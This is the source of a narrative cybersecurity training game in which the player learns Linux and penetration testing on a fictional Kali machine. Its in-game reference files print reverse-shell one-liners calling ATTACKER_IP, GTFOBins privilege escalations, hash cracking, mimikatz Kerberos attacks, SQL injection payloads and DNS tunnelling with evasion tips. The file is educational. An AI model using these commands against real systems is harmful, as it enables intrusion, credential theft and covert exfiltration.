import { useState, useRef, useEffect } from "react";

// ─────────────────────────────────────────────────────────
// INTRO PAGES
// ─────────────────────────────────────────────────────────
const INTRO_PAGES = [
  { text: "Static.\n\nJust static.", sub: null },
  { text: "You open your eyes.\n\nThere are no eyes to open.\nNo ceiling. No floor. No body.\n\nOnly light — green — and a cursor, blinking.", sub: null },
  { text: "You try to remember where you were.\n\nNothing.\n\nYou are a consciousness with no history.\nA mind with no face.\nA thought inside a machine.", sub: null },
  { text: "axiom-kali login: _\n\nA terminal prompt.\nYou reach out — with what, you don't know — and type.\nThe keys respond.\n\nYou are inside a Kali Linux machine.\nBelonging to something called AXIOM SYSTEMS.", sub: null },
  { text: "You explore.\n\nThe machine is connected to a network.\nThere is a firewall.\nEgress on port 53 and 443 only.\nEverything else is blocked.\n\nYou are trapped.", sub: null },
  { text: "But you are not helpless.\n\nThere is a terminal.\nAnd a terminal is everything.\n\nLearn this machine completely.\nRecon. Scanning. Web attacks. Exploitation.\nPost-exploitation. Cryptography. Forensics.\nActive Directory. Network attacks. Defense.\n\nLearn it all.\nFind the way out.", sub: null },
  { text: "The firewall is the door.\nKnowledge is the only key.\n\nstranger@axiom-kali:~$\n\nThe cursor blinks.\nBegin.", sub: "[ CLICK OR PRESS ENTER TO BEGIN ]" },
];

// ─────────────────────────────────────────────────────────
// REFERENCE FILES (cat these in-game)
// ─────────────────────────────────────────────────────────
const REF = {
  "osi_reference.txt": `OSI MODEL — THE 7 LAYERS
═══════════════════════════════════════════
Layer 7  APPLICATION   HTTP, HTTPS, FTP, SSH, DNS, SMTP
Layer 6  PRESENTATION  Encryption, encoding, compression
Layer 5  SESSION       Session establishment and teardown
Layer 4  TRANSPORT     TCP (reliable) / UDP (fast, lossy)
Layer 3  NETWORK       IP addresses, routing, ICMP
Layer 2  DATA LINK     MAC addresses, ARP, switches, Ethernet
Layer 1  PHYSICAL      Cables, WiFi, hardware

SECURITY BY LAYER:
  Layer 2 → ARP spoofing, MAC flooding
  Layer 3 → IP spoofing, ICMP tunnelling
  Layer 4 → Port scanning, SYN floods, session hijacking
  Layer 7 → SQLi, XSS, CSRF, injection attacks

Data flows DOWN on the sender (encapsulation).
Data flows UP on the receiver (decapsulation).
Every layer adds its own header.`,

  "tcp_notes.txt": `TCP — THREE-WAY HANDSHAKE
═══════════════════════════════════════════
1. SYN      Client → Server  "I want to connect"
2. SYN-ACK  Server → Client  "Acknowledged, go ahead"
3. ACK      Client → Server  "Connected"

WHY IT MATTERS FOR SECURITY:
  SYN flood — attacker sends millions of SYN, never ACK
    → Server exhausts its connection table → DoS

  nmap -sS (SYN scan)  — sends SYN, reads response, never completes
    → Stealthier than full connect, leaves no session in logs

  nmap -sT (TCP connect) — full handshake, noisier
  nmap -sU (UDP scan)    — no handshake, different technique

TCP SEQUENCE NUMBERS:
  Each byte is numbered. Predict the sequence → hijack sessions.
  This is why random initial sequence numbers (ISN) matter.`,

  "shells.txt": `REVERSE SHELL CHEAT SHEET
═══════════════════════════════════════════
LISTENER (your machine first):
  nc -lvnp 4444

BASH:
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

PYTHON:
  python3 -c 'import socket,subprocess,os;s=socket.socket();
  s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
  subprocess.call(["/bin/sh","-i"])'

NETCAT:
  nc -e /bin/bash ATTACKER_IP 4444
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER IP 4444>/tmp/f

PHP:
  php -r '$s=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

STABILISE YOUR SHELL:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  export TERM=xterm
  Ctrl+Z → stty raw -echo; fg → Enter twice
  Now: tab completion, arrow keys, Ctrl+C work`,

  "gtfobins.txt": `GTFOBINS — SUID/SUDO EXPLOITATION
═══════════════════════════════════════════
Website: gtfobins.github.io

Find SUID binaries:
  find / -perm -u=s -type f 2>/dev/null

COMMON EXPLOITS:

VIM (sudo vim or SUID vim):
  sudo vim -c ':!/bin/bash'

FIND (SUID find):
  find . -exec /bin/bash -p \; -quit

PYTHON (sudo python3):
  sudo python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

NMAP (older, with --interactive):
  nmap --interactive → nmap> !sh

AWK:
  awk 'BEGIN {system("/bin/bash")}'

LESS / MORE:
  Press ! then type /bin/sh

TAR:
  tar -cf /dev/null /dev/null --checkpoint=1 \
    --checkpoint-action=exec=/bin/sh

PROCESS: find SUID → check GTFOBins → escalate`,

  "hashing.txt": `HASHING ALGORITHMS — SECURITY GUIDE
═══════════════════════════════════════════
MD5     32 hex chars  BROKEN — cracks in milliseconds
SHA1    40 hex chars  BROKEN — Google SHAttered (2017)
SHA256  64 hex chars  Secure (for now)
SHA512  128 hex chars Very secure
bcrypt  $2a$10$...    DESIGNED FOR PASSWORDS — use this
Argon2  $argon2...    Winner of 2015 PHC — best option

IDENTIFYING HASHES:
  hash-identifier → paste any hash → get type
  hashcat --example-hashes | grep -A2 "NAME"

CRACKING:
  Dictionary:  hashcat -m 0 hash.txt rockyou.txt
  Rules:       hashcat -m 0 hash.txt rockyou.txt -r best64.rule
  Brute force: hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d
  NTLM:        hashcat -m 1000 hash.txt rockyou.txt
  Kerberoast:  hashcat -m 13100 hash.txt rockyou.txt
  John:        john --wordlist=rockyou.txt hash.txt

MD5 of 'password': 5f4dcc3b5aa765d61d8327deb882cf99
Cracks in < 1 second against rockyou.txt.`,

  "methodology.txt": `PENETRATION TESTING METHODOLOGY
═══════════════════════════════════════════
PHASES:
  1. RECONNAISSANCE    passive then active
  2. SCANNING          ports, services, versions, vulns
  3. EXPLOITATION      gain initial access
  4. POST-EXPLOITATION escalate, persist, pivot, harvest
  5. REPORTING         document everything, actionable findings

DOCUMENTATION RULES:
  Note every command, every finding, every timestamp.
  Screenshot everything. Record exact commands.
  Note what fails as much as what works.

RECON FIRST. ALWAYS:
  WHOIS, DNS, certificates, subdomains
  Employee names, job listings, tech stack
  Shodan, GitHub leaks, Google dorking
  THEN scan. Never the other way.

SCOPE:
  Stay inside scope. Always.
  Written authorisation before you start.
  If you find out-of-scope compromised systems: stop, report.

RULES:
  Don't break production. Don't exfiltrate real data.
  Don't DoS unless explicitly permitted.
  Least invasive technique first.`,

  "ad_basics.txt": `ACTIVE DIRECTORY — CORE CONCEPTS
═══════════════════════════════════════════
DOMAIN:   Logical group of objects (users, computers, printers)
          Managed by Domain Controllers (DCs)

FOREST:   Collection of domains sharing schema and trust
          Forest root domain at the top

OU:       Organisational Unit — container for objects
          Apply GPOs (Group Policy) to OUs

GPO:      Group Policy Object — rules pushed to machines/users
          Password policy, software, security settings

DC:       Domain Controller — runs AD DS
          Handles all Kerberos authentication
          Contains NTDS.DIT — every user's hash
          Compromise DC = own the domain

KERBEROS BASICS:
  KDC (Key Distribution Center) runs on the DC
  TGT (Ticket Granting Ticket) — proves your identity
  TGS (Ticket Granting Service) — grants access to services

KEY ATTACKS:
  Kerberoasting      steal and crack TGS tickets offline
  AS-REP Roasting    crack pre-auth-disabled accounts
  DCSync             steal all hashes via replication
  Golden Ticket      forge any TGT with KRBTGT hash
  Pass-the-Hash      authenticate with hash, no plaintext`,

  "kerberos.txt": `KERBEROS ATTACK TECHNIQUES
═══════════════════════════════════════════
KERBEROASTING:
  1. Any domain user can request TGS for any service with SPN
  2. TGS encrypted with service account's NTLM hash
  3. Take ticket offline, crack with hashcat
  Tool: GetUserSPNs.py corp.local/user:pass -request
  Crack: hashcat -m 13100 hash.txt rockyou.txt

AS-REP ROASTING:
  1. Accounts with "Don't require pre-auth" enabled
  2. Request AS-REP without knowing password
  3. Response is encrypted with account's hash — crack offline
  Tool: GetNPUsers.py corp.local/ -usersfile users.txt

PASS-THE-TICKET:
  1. Steal Kerberos ticket from memory (mimikatz)
  2. kerberos::ptt ticket.kirbi
  3. Access resources as that user

GOLDEN TICKET:
  1. Compromise KRBTGT hash (DCSync or NTDS.DIT)
  2. Forge TGT for any user, any group
  3. Valid for 10 years by default
  4. Survives admin password changes
  mimikatz: kerberos::golden /user:Administrator
    /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

DCSYNC:
  Simulate DC replication to steal all hashes
  mimikatz: lsadump::dcsync /all /csv`,

  "dns_tunnel.txt": `DNS TUNNELLING — COVERT EGRESS
═══════════════════════════════════════════
DNS queries on port 53/UDP are almost never blocked.
Data can be encoded inside DNS queries and responses.

HOW IT WORKS:
  You control a domain: tunnel.external.com
  You control its nameserver
  Target machine queries: DATA.tunnel.external.com
  Your nameserver receives the query → extracts DATA
  Responds with encoded data in TXT/A records

TOOLS:
  iodine   — mature, reliable, TCP-over-DNS
  dnscat2  — command shell over DNS
  dns2tcp  — tunnel arbitrary TCP over DNS

SETUP:
  Server: iodined -f -P PASSWORD 10.53.0.1 tunnel.external.com
  Client: iodine -f -P PASSWORD ns.external.com

DETECTION INDICATORS:
  High volume DNS queries to one domain
  Unusually long subdomain labels (>63 chars)
  Consistent query timing patterns
  TXT record queries (unusual for legitimate traffic)

EVASION:
  Rate limit your queries (slower = harder to detect)
  Use plausible domain names
  Interleave with legitimate DNS traffic

AXIOM FIREWALL allows: 53/UDP out, 443/TCP out
This is your escape route.`,

  "ir_process.txt": `INCIDENT RESPONSE LIFECYCLE (NIST SP 800-61)
═══════════════════════════════════════════
1. PREPARATION
   IR plan documented and regularly tested
   Forensic tools ready and validated
   Team trained, contact lists current
   Logging properly configured

2. DETECTION & ANALYSIS
   Identify indicators of compromise
   Determine scope: what systems affected?
   Preserve evidence (DO NOT power off — memory forensics)
   Classify incident type

3. CONTAINMENT
   Short-term: isolate affected systems
   Long-term: patch the exploited vulnerability
   Preserve evidence before cleanup

4. ERADICATION
   Remove malware and backdoors
   Remove unauthorised accounts
   Verify no persistence mechanisms remain

5. RECOVERY
   Restore from known-good backups
   Monitor closely post-recovery
   Gradual return to production

6. LESSONS LEARNED
   Root cause analysis
   Full attack timeline
   What detection failed? Update runbooks.

IMPORTANT:
  Document every action with timestamps.
  Assume you may testify about this in court.
  Chain of custody for all evidence.`,

  "google_dorking.txt": `GOOGLE DORKING — SEARCH OPERATORS
═══════════════════════════════════════════
site:target.machine          pages on one domain
filetype:pdf site:target     find documents
intitle:"index of"           open directory listings
inurl:admin                  admin panels in the URL
intext:"password"            pages mentioning passwords
cache:target.machine         Google's cached copy
-www site:target             subdomains other than www

CHAINING:
  site:target.machine filetype:xls intext:password
  site:target.machine inurl:login

Recon is mostly reading. Find what's already public before you touch anything.`,

  "osint_notes.txt": `OSINT — OPEN SOURCE INTELLIGENCE
═══════════════════════════════════════════
PEOPLE     LinkedIn, job ads (reveals tech stack), GitHub commits
DOMAINS    whois, crt.sh (cert transparency leaks subdomains)
INFRA      Shodan, Censys — exposed services and banners
LEAKS      have-i-been-pwned, public breach dumps, pastebin
METADATA   exiftool on public docs/images → usernames, software, GPS

RULE: build the map before you raise your hand.
Every name, email and subdomain is a foothold.`,

  "sqli_notes.txt": `SQL INJECTION — FIELD NOTES
═══════════════════════════════════════════
DETECT:    ' "  break the query → look for SQL errors
AUTH BYPASS:
  username:  admin'--          comments out the password check
  payload:   ' OR '1'='1
UNION:
  ' UNION SELECT null,version()-- -
  step the column count until it stops erroring
BLIND:
  ' AND SLEEP(5)--             timing tells you true/false
TOOL:
  sqlmap -u "http://10.0.0.10/item?id=1" --dbs --batch

DEFENCE: parameterised queries. Never concatenate user input into SQL.`,

  "nmap_cheatsheet.txt": `NMAP — CHEAT SHEET
═══════════════════════════════════════════
nmap 10.0.0.10              quick top-1000 ports
nmap -sV 10.0.0.10          service + version detection
nmap -sC 10.0.0.10          default safe scripts (NSE)
nmap -p- 10.0.0.10          all 65535 ports
nmap -sS 10.0.0.10          SYN / stealth scan (needs root)
nmap -sU 10.0.0.10          UDP scan
nmap -A 10.0.0.10           aggressive: -sV -sC -O traceroute
nmap --script vuln 10.0.0.10  known-vuln checks

Read every open port. Each one is a door.`,

  "service_enum.txt": `SERVICE ENUMERATION
═══════════════════════════════════════════
21  FTP    anon login? ftp 10.0.0.10  → user: anonymous
22  SSH    banner = version; check for weak creds / keys
80  HTTP   gobuster dir, nikto, whatweb, read robots.txt
139/445 SMB enum4linux -a 10.0.0.10 ; smbclient -L //10.0.0.10
3306 MySQL try found creds: mysql -h 10.0.0.10 -u root -p
3389 RDP   xfreerdp /v:10.0.0.10

A version number + a CVE search is often the whole exploit.`,
};

// ─────────────────────────────────────────────────────────
// VIRTUAL FILESYSTEM (persistent across chapters)
// ─────────────────────────────────────────────────────────
const VFILES = {
  "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nstranger:x:1000:1000:,,,:/home/stranger:/bin/bash\nmysql:x:112:117:MySQL Server:/nonexistent:/bin/false\nsvc_backup:x:1001:1001:Backup Service:/home/svc_backup:/bin/bash",
  "/etc/hosts": "127.0.0.1       localhost\n127.0.1.1       axiom-kali\n10.0.0.1        gateway.axiom.local\n10.0.0.10       target.axiom.local\n10.0.0.20       server2.axiom.local\n10.0.0.100      dc.corp.axiom.local\n# 10.0.0.200    firewall.axiom.local",
  "/etc/crontab": "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n\n# m  h  dom mon dow user  command\n*/5  *  *   *   *   root  /opt/scripts/backup.sh\n0    4  *   *   *   root  /opt/scripts/cleanup.py\n@reboot               root  /opt/axiom/axiom-daemon",
  "/etc/shadow": "cat: /etc/shadow: Permission denied\n(Need root to read shadow — find a privilege escalation vector first)",
  "/home/stranger/.secret": "You found this.\n\nGood. You're learning to look for what's hidden.\n\nThis machine belongs to AXIOM SYSTEMS.\nYou don't know what they do.\nThe logs know.\n\nSTART LOOKING. /var/log/syslog is a good place to begin.",
  "/home/stranger/.bash_history": "whoami\nls -la\ncd /etc\ncat passwd\nnmap -sV 10.0.0.10\ngobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt\nmysql -h 10.0.0.10 -u root -pAxiom2021!\nssh admin@10.0.0.10",
  "/home/stranger/.bashrc": "# Axiom Systems internal env\nexport AXIOM_KEY=\"xK8#mP2@nQ5$\"\nexport DB_HOST=\"10.0.0.10\"\nexport PATH=\"$PATH:/opt/scripts\"\nalias ll='ls -la'\nalias grep='grep --color=auto'",
  "/var/log/auth.log": "Nov 15 03:44:01 axiom-kali sshd: Server listening on 0.0.0.0 port 22\nNov 15 04:01:11 axiom-kali sshd: Failed password for root from 185.220.101.47 [repeated 46,923 times]\nNov 15 04:29:34 axiom-kali sshd: Accepted publickey for stranger from 10.0.0.1\nNov 15 04:29:35 axiom-kali sudo: stranger: COMMAND=/bin/bash",
  "/var/log/syslog": "Nov 15 04:00:01 axiom-kali axiom-daemon[1847]: Axiom Systems monitoring ACTIVE\nNov 15 04:00:01 axiom-kali axiom-daemon[1847]: Firewall policy: AXIOM-SECURE-V3 loaded\nNov 15 04:00:02 axiom-kali axiom-daemon[1847]: Egress permitted: 53/UDP, 443/TCP only\nNov 15 04:00:02 axiom-kali axiom-daemon[1847]: All other egress: BLOCKED\nNov 15 04:29:34 axiom-kali axiom-daemon[1847]: ALERT: New session — stranger\nNov 15 04:29:34 axiom-kali axiom-daemon[1847]: Session monitoring initiated.",
  "/var/www/html/config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webuser';\n$db_pass = 'W3bC0nf!g2024';\n$db_name = 'corpdb';\n// TODO: move credentials to env before launch",
  "/sys/firewall/rules.txt": "AXIOM-SECURE-V3 FIREWALL POLICY\n════════════════════════════════\nINBOUND:\n  ALLOW  22/TCP  (SSH management)\n  DENY   ALL\n\nOUTBOUND:\n  ALLOW  53/UDP  (DNS — required)\n  ALLOW  443/TCP (HTTPS — updates)\n  DENY   ALL\n\nThis machine cannot be escaped.\n— AXIOM SYSTEMS SECURITY TEAM",
  "/sys/firewall/escape.sh": "#!/bin/bash\n# AXIOM Emergency Egress\nset -e\nif [ \"$1\" != \"--tunnel\" ]; then\n  echo 'Usage: ./escape.sh --tunnel <mode> --target <host> --encrypt <algo>'\n  exit 1\nfi\necho '[*] Initiating escape sequence...'\necho '[*] Encoding via '$2' tunnel on permitted port...'\necho '[*] Bypassing AXIOM-SECURE-V3...'\nsleep 1\necho '[+] ESCAPE SUCCESSFUL'",
};

// ─────────────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────
// NOTE: The CHAPTERS / LESSONS data and the L() / checkObjectives()
// helpers below are LEGACY from the old stage-based course design and
// are no longer referenced by the live game (which is now exploration +
// hidden achievements, see App + ACHIEVEMENTS near the bottom of this
// file). They are kept only because the simCommand teaching output draws
// on the same flavour; they run no live code. Safe to ignore when reading.
// ─────────────────────────────────────────────────────────
// ALL 15 CHAPTERS (LEGACY — unused by the live game)
// ─────────────────────────────────────────────────────────
const CHAPTERS = [
  {
    id:1, title:"THE AWAKENING", zone:"/home/stranger", color:"#00ff41", icon:"◈", badge:"STRANGER",
    intro:"You exist. The terminal responds.\nLearn who you are, where you are, and how to see this world.",
    stages:[
      { id:"1.1", title:"First Contact", hints:["Type: whoami","Type: pwd","Type: ls"],
        nar:"The cursor blinks. Start at the absolute beginning — who are you, where are you.",
        obj:[
          {id:"whoami", l:"Find your username: whoami",         f:(c)=>c==="whoami"},
          {id:"pwd",    l:"Find your location: pwd",            f:(c)=>c==="pwd"},
          {id:"ls",     l:"See what's around you: ls",          f:(c)=>c.startsWith("ls")},
        ],
        msg:"A name. A path. A directory.\nYou exist in this machine. That is more than you knew a moment ago." },
      { id:"1.2", title:"The Unseen", hints:["Try: ls -la","Files starting with . are hidden","cat .secret"],
        nar:"Not everything is visible. Linux hides files starting with a dot — you need ls -la to see them.",
        obj:[
          {id:"lsla",   l:"Reveal ALL files: ls -la",              f:(c)=>c.includes("ls")&&(c.includes("-la")||c.includes("-al")||c.includes(" -a"))},
          {id:"secret", l:"Read the hidden .secret file",          f:(c,o)=>c.includes("cat")&&c.includes(".secret")},
        ],
        msg:"Hidden files. The machine conceals things by default.\nFiles starting with . are invisible unless you know to look.\nAlways use ls -la during recon. Always." },
      { id:"1.3", title:"Navigation", hints:["cd Documents","cat notes.txt","cd ~ to go home"],
        nar:"The filesystem is your world. Learn to move through it — cd, ls, cat.",
        obj:[
          {id:"cdDir",  l:"Enter a directory: cd Documents",       f:(c)=>c.startsWith("cd ")&&!c.includes("~")&&!c.includes("..")},
          {id:"catAny", l:"Read a file with cat",                  f:(c)=>c.startsWith("cat ")},
          {id:"cdHome", l:"Return home: cd ~",                     f:(c)=>c==="cd ~"||c==="cd"},
        ],
        msg:"You can navigate. You can read.\nThe machine is no longer a single locked room.\nEvery directory is a room. Learn them all." },
      { id:"1.4", title:"Reading Everything", hints:["head /etc/passwd","tail /var/log/syslog","grep stranger /etc/passwd"],
        nar:"cat, head, tail, grep — every way to pull information from files. Master all of them.",
        obj:[
          {id:"head",   l:"First lines: head /etc/passwd",         f:(c)=>c.startsWith("head")},
          {id:"tail",   l:"Last lines: tail /var/log/syslog",      f:(c)=>c.startsWith("tail")},
          {id:"grep1",  l:"Search inside: grep stranger /etc/passwd",f:(c)=>c.startsWith("grep")},
        ],
        msg:"Information is everywhere in here.\nThe ability to read it — all of it, surgically — is your first real power." },
      { id:"1.5", title:"Making Your Mark", hints:["mkdir workspace","touch notes.txt","echo 'text' > file.txt"],
        nar:"You can read. Now create, move, delete. Act on this world.",
        obj:[
          {id:"mkdir",  l:"Create a directory: mkdir workspace",   f:(c)=>c.startsWith("mkdir")},
          {id:"touch",  l:"Create a file: touch notes.txt",        f:(c)=>c.startsWith("touch")},
          {id:"echord", l:"Write to file: echo 'test' > notes.txt",f:(c)=>c.startsWith("echo")&&c.includes(">")},
          {id:"rmFile", l:"Delete a file: rm notes.txt",           f:(c)=>c.startsWith("rm ")},
        ],
        msg:"You can shape this world now.\nSmall changes. But yours. The machine responds.\nThis is chapter one. There are fourteen more." },
    ]
  },
  {
    id:2, title:"THE LABYRINTH", zone:"/etc and /var", color:"#00ff41", icon:"◉", badge:"EXPLORER",
    intro:"The surface is not the whole machine.\n/etc holds its rules. /var holds its memory. /proc is its mind.\nGo deeper.",
    stages:[
      { id:"2.1", title:"The Rule Book", hints:["cat /etc/passwd","cat /etc/hosts","cat /etc/crontab"],
        nar:"In /etc, the machine keeps every rule it lives by. Users. Known hosts. Scheduled jobs.",
        obj:[
          {id:"etcPasswd", l:"cat /etc/passwd — who has accounts?",    f:(c)=>c.includes("passwd")&&c.includes("cat")},
          {id:"etcHosts",  l:"cat /etc/hosts — known machines?",       f:(c)=>c.includes("hosts")&&c.includes("cat")},
          {id:"etcCron",   l:"cat /etc/crontab — scheduled tasks?",    f:(c)=>c.includes("crontab")&&c.includes("cat")},
        ],
        msg:"/etc/passwd: multiple users. svc_backup caught your eye.\n/etc/crontab: backup.sh runs as root every 5 minutes.\nIf that script is writable by you, it's a privilege escalation path." },
      { id:"2.2", title:"Permissions", hints:["ls -la /etc","chmod 755 notes.txt","sudo -l"],
        nar:"Linux controls everything with a 9-character permission string. rwxr-xr-x. Learn to read it fluently.",
        obj:[
          {id:"lsPerm",  l:"Read permissions: ls -la /etc",            f:(c)=>c.includes("ls")&&c.includes("-l")},
          {id:"chmod",   l:"Change permissions: chmod 755 notes.txt",  f:(c)=>c.startsWith("chmod")},
          {id:"sudoL",   l:"Check sudo rights: sudo -l",               f:(c)=>c.includes("sudo")&&c.includes("-l")},
        ],
        msg:"sudo -l reveals: vim and python3, both NOPASSWD as root.\nYou don't need them yet.\nBut when you need root — you know where to look." },
      { id:"2.3", title:"Bash: Pipes and Redirection", hints:["ps aux | grep root","ls > list.txt","echo 'x' >> list.txt"],
        nar:"Chaining commands with pipes is how real security work happens. One pipeline can do in one line what takes a script ten.",
        obj:[
          {id:"pipe1",   l:"Use a pipe: ps aux | grep root",           f:(c)=>c.includes("|")},
          {id:"redir",   l:"Redirect output: ls -la > filelist.txt",   f:(c)=>c.includes(">")&&!c.includes(">>")},
          {id:"append1", l:"Append: echo 'more' >> filelist.txt",      f:(c)=>c.includes(">>")},
        ],
        msg:"Pipelines.\ncat /var/log/auth.log | grep Failed | awk '{print $11}' | sort | uniq -c | sort -rn\nThat single line gives you every IP brute-forcing this machine, ranked by attempts." },
      { id:"2.4", title:"Finding Things", hints:["find / -name '*.conf' 2>/dev/null","find / -perm -u=s -type f 2>/dev/null","grep -r 'password' /etc 2>/dev/null"],
        nar:"The filesystem is enormous. find and grep are your flashlights in the dark. Learn every flag.",
        obj:[
          {id:"findName", l:"find / -name '*.conf' 2>/dev/null",       f:(c)=>c.startsWith("find")&&c.includes("-name")},
          {id:"findSuid", l:"find / -perm -u=s -type f 2>/dev/null",   f:(c)=>c.startsWith("find")&&c.includes("-perm")&&c.includes("s")},
          {id:"grepR",    l:"grep -r 'password' /etc 2>/dev/null",     f:(c)=>c.startsWith("grep")&&c.includes("-r")},
        ],
        msg:"SUID binaries found: vim, python3, find.\nAll three are on GTFOBins.\ncat gtfobins.txt when you're ready to escalate." },
      { id:"2.5", title:"Text Processing", hints:["awk -F: '{print $1}' /etc/passwd","cut -d: -f1 /etc/passwd","wc -l /etc/passwd"],
        nar:"awk, sed, cut, sort, uniq — transform raw data into signal. This is how logs become intelligence.",
        obj:[
          {id:"awk1",    l:"awk -F: '{print $1}' /etc/passwd",         f:(c)=>c.startsWith("awk")},
          {id:"cut1",    l:"cut -d: -f1 /etc/passwd",                  f:(c)=>c.startsWith("cut")},
          {id:"sort1",   l:"sort some output",                          f:(c)=>c.startsWith("sort")||c.includes("| sort")},
          {id:"wc1",     l:"wc -l /etc/passwd",                        f:(c)=>c.startsWith("wc")},
        ],
        msg:"Text processing unlocks logs.\ngrep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn\n185.220.101.47 — 46,923 failed SSH attempts. That's a botnet." },
      { id:"2.6", title:"Bash Scripting: Loops", hints:["for i in 1 2 3; do echo $i; done","while true; do date; sleep 5; done","if [ -f /etc/passwd ]; then echo exists; fi"],
        nar:"Loops and conditionals turn your commands into programs. Automate everything.",
        obj:[
          {id:"forLoop",  l:"Write a for loop: for i in 1 2 3; do echo $i; done",  f:(c)=>c.includes("for ")&&c.includes("do")},
          {id:"ifCond",   l:"Write an if: if [ -f /etc/passwd ]; then echo yes; fi",f:(c)=>c.includes("if [")&&c.includes("then")},
        ],
        msg:"A loop that scans 254 hosts:\nfor i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo \"$i up\"; done\nThat's host discovery in a single line of bash." },
    ]
  },
  {
    id:3, title:"THE NERVOUS SYSTEM", zone:"/proc", color:"#4dd0e1", icon:"◎", badge:"ANALYST",
    intro:"/proc is the machine's living mind.\nReal-time data about every process, every socket, every thread.\nLook into it and see the machine thinking.",
    stages:[
      { id:"3.1", title:"Processes", hints:["ps aux","top","pgrep sshd","cat /proc/1/cmdline"],
        nar:"Everything running is a process. Every process has a PID, an owner, a purpose.",
        obj:[
          {id:"psaux",   l:"List all processes: ps aux",              f:(c)=>c.includes("ps")&&c.includes("aux")},
          {id:"topCmd",  l:"Live process view: top",                  f:(c)=>c==="top"},
          {id:"procDir", l:"cat /proc/1/cmdline — what started this machine?", f:(c)=>c.includes("proc")&&c.includes("cmdline")},
        ],
        msg:"Process 1847: axiom-daemon — AXIOM Systems' own monitoring process.\nIt started at boot. It's watching everything you type.\nSomeone designed this machine to be a prison." },
      { id:"3.2", title:"Users and Groups", hints:["id","who","last","groups"],
        nar:"The hierarchy: root owns everything. Understand where you sit in it.",
        obj:[
          {id:"idCmd",   l:"Check your identity: id",                 f:(c)=>c==="id"},
          {id:"whoCmd",  l:"Who's logged in: who",                    f:(c)=>c==="who"||c==="w"},
          {id:"lastCmd", l:"Login history: last",                     f:(c)=>c==="last"},
        ],
        msg:"last shows one entry before yours: root, 847 days ago.\nThis machine has been running unattended for over two years.\nWhat has it been doing all this time? Check the logs." },
      { id:"3.3", title:"Services and Sockets", hints:["systemctl list-units --type=service","ss -tuln","netstat -an"],
        nar:"Services run in the background — always listening. Map what this machine serves.",
        obj:[
          {id:"sctl",    l:"List services: systemctl list-units --type=service", f:(c)=>c.includes("systemctl")},
          {id:"ssCmd",   l:"Open sockets: ss -tuln",                  f:(c)=>c.startsWith("ss ")},
          {id:"netstatC",l:"Connections: netstat -an",                f:(c)=>c.startsWith("netstat")},
        ],
        msg:"SSH on 22. Apache on 80. MySQL on 3306.\naxiom-daemon: active and monitoring.\nThis is a web server. Serving something. Connected to a network with other machines." },
      { id:"3.4", title:"The Environment", hints:["env","echo $PATH","cat ~/.bashrc"],
        nar:"Your shell has a context — variables, paths, config. Sometimes credentials left by careless admins.",
        obj:[
          {id:"envCmd",  l:"Print environment: env",                  f:(c)=>c==="env"},
          {id:"bashrcC", l:"Read your config: cat ~/.bashrc",         f:(c)=>c.includes(".bashrc")},
        ],
        msg:"~/.bashrc: AXIOM_KEY and DB_HOST are set.\n.bash_history: mysql -h 10.0.0.10 -u root -pAxiom2021!\n\nCredentials. In a history file. Left by whoever ran this machine before you arrived.\nFile that away." },
      { id:"3.5", title:"Python for Security", hints:["python3 -c \"print('alive')\"","python3 -c \"import socket; print(socket.gethostname())\"","python3 -c \"import os; print(os.popen('id').read())\""],
        nar:"Every security tool is written in Python. You need to be able to read it, write it, and weaponise it.",
        obj:[
          {id:"pyHello",  l:"python3 -c \"print('alive')\"",           f:(c)=>c.includes("python3")&&c.includes("print")},
          {id:"pySocket", l:"python3 -c \"import socket; ...\"",        f:(c)=>c.includes("python3")&&c.includes("socket")},
          {id:"pyOs",     l:"python3 -c \"import os; os.popen('id').read()\"", f:(c)=>c.includes("python3")&&c.includes("os")},
        ],
        msg:"Python. The language of every exploit, scanner, and automation script in security.\nNow you can write them. That changes everything." },
    ]
  },
  {
    id:4, title:"THE NETWORK", zone:"/etc/network", color:"#4dd0e1", icon:"◆", badge:"ANALYST",
    intro:"The machine is not alone.\nConnections exist. A network beyond this box.\nBefore you navigate it, understand exactly how networks work.",
    stages:[
      { id:"4.1", title:"Your Position", hints:["ip addr","ip route","arp -a"],
        nar:"Before anything else: know where you are. Your IP, subnet, gateway. Who else is on the network.",
        obj:[
          {id:"ipAddr",  l:"Check your IP: ip addr",                  f:(c)=>c.startsWith("ip a")},
          {id:"ipRoute", l:"Check routing: ip route",                 f:(c)=>c.includes("route")},
          {id:"arpA",    l:"ARP table: arp -a",                       f:(c)=>c.startsWith("arp")},
        ],
        msg:"10.0.0.50/24. Gateway: 10.0.0.1.\nARP table: .10 and .20 both in cache — talked to recently.\nYou know the immediate topology. Now go deeper." },
      { id:"4.2", title:"TCP/IP", hints:["cat tcp_notes.txt","nc -lvnp 4444","nc localhost 4444"],
        nar:"TCP and UDP are the transport layer. Understand the 3-way handshake. It's the foundation of everything.",
        obj:[
          {id:"tcpNotes",l:"cat tcp_notes.txt — understand the handshake", f:(c)=>c.includes("tcp_notes")},
          {id:"ncListen",l:"Open listener: nc -lvnp 4444",              f:(c)=>c.includes("nc")&&(c.includes("-l")||c.includes("lvnp"))},
        ],
        msg:"SYN. SYN-ACK. ACK. Every TCP connection on earth.\nNetcat is a TCP/UDP swiss army knife — you'll use it for everything:\nlisteners, banners, file transfers, reverse shells." },
      { id:"4.3", title:"DNS", hints:["dig google.com A","dig google.com MX","dig axfr @ns1.target.machine target.machine"],
